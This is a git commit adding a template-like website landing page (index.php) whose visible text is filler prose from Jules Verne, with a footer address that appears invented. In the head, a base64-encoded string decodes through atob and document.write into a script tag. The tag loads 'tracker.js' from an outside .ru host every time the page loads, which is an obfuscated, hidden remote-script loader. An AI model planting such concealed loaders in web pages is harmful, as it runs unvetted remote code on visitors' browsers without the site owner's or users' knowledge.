9e4ba903e51500f85ea7aec65a36f0299f274974
pxsumcja <77447125+pxsumcja@users.noreply.github.com>
2021-01-14 15:57:56 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Let us try, professor.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl8xeHd5ZnI2MXZ1NmxpMTA0cTkiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="sd0reawd7vjcwgs00dc3p74">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="idk8c0erozavdf26hzftd">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Let us try, professor.</h1>
+	</section>
+
+
+	<section class="our-work" class="65gh0kpunzmb82zpsswmrlk">
+		<h3 class="title">Those are cachalots-terrible animals, which I have </h3>
+		<p>But, continued the Canadian, if I am surprised I will defend myself; I will force them to kill me. That shock threw you as well as me into the sea? There was no doubt about it! This monster, this natural phenomenon that had puzzled the learned world, and overthrown and misled the imagination of seamen of both hemispheres, was, it must be owned, a still more astonishing phenomenon, inasmuch as it was simply a human construction. My eyes turned involuntarily toward the glass, but I could not stand the fire which seemed to devour them. I understood what had happened. The Nautilus had put on full speed. All the quiet luster of the ice-walls was at once changed into flashes of lightning. The fire from these myriads of diamonds was blinding. It required some time to calm our troubled looks. At last the hands were taken down.</p>
+		<hr>
+
+		<ul class="grid" class="jsmxm9egf9k2ggzr5j1">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="sd0reawd7vjcwgs00dc3p74">
+		<h3 class="title">And the canal in which we are at this mome</h3>
+		<p>The waves were impregnated with a mass of blood. They rocked under the shark's movements, which beat them with indescribable fury. Ned Land had not missed his aim. It was the monster's death-rattle. Struck to the heart, it struggled in dreadful convulsions, the shock of which overthrew Conseil. Well, sir? said Ned Land, who came up to me after the departure of the captain. Will you allow me to make one observation, sir? said Conseil. Poor Ned is longing for everything that he cannot have. His past life is always present to him; everything that we are forbidden he regrets. His head is full of old recollections. And we must understand him. What has he to do here? Nothing; he is not learned like you, sir; and has not the same taste for the beauties of the sea that we have. He would risk everything to be able to go once more into a tavern in his own country. I listen, captain, said I, not knowing what my interlocutor was driving at, and asking myself if this incident was bearing on our projected flight.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="idk8c0erozavdf26hzftd" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="jsmxm9egf9k2ggzr5j1" class="title">I stared at the singular person who spoke thus. Was he playing </h3>	
+		<p>The sea was distinctly visible for a mile all round the Nautilus. What a spectacle! What pen can describe it? Who could paint the effects of the light through those transparent sheets of water, and the softness of the successive gradations from the lower to the superior strata of the ocean? What! the archiotherium, the hyracotherium, the oreodons, the cheropotamus, and the other skins? An amateur, nothing more, sir. Formerly I loved to collect these beautiful works created by the hand of man. I sought them greedily and ferreted them out indefatigably, and I have been able to bring together some objects of great value. These are my last souvenirs of that world which is dead to me. In my eyes, your modern artists are already old; they have two or three thousand years of existence; I confound them in my own mind. Masters have no age. Well, I think-I do not say I hope-I think that this favorable opportunity will never present itself.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="sd0reawd7vjcwgs00dc3p74">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="idk8c0erozavdf26hzftd"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="65gh0kpunzmb82zpsswmrlk"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="jsmxm9egf9k2ggzr5j1"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>83595 Nitzsche Lodge, Apt. 881, 31703-8282, Jadonhaven, Virginia, United States</p>
+	</footer>
+
+</body>
+
+</html>
